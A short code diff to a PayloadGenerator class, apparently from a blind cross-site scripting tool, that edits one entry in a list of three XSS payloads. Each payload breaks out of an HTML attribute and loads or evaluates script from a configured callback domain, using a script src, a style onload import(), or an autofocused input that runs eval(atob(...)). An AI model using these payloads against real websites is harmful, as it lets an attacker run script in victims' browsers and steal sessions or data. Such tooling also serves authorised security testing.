@@ -30,7 +30,7 @@ class PayloadGenerator:
 
         payloads = [
             f'\"\'><script src="//{self.config.domain}/{unique_id}"></script>',
-            f'\"\'><style/onload=import("//{self.config.domain}/{unique_id}")>',
+            f'\"\'><style/onload=import("//{self.config.domain}/{unique_id}")></style>',
             f'\'\"><input on onfocus=eval(atob(this.id)) id={base64Code} autofocus>'
         ]
         self.payloads = payloads
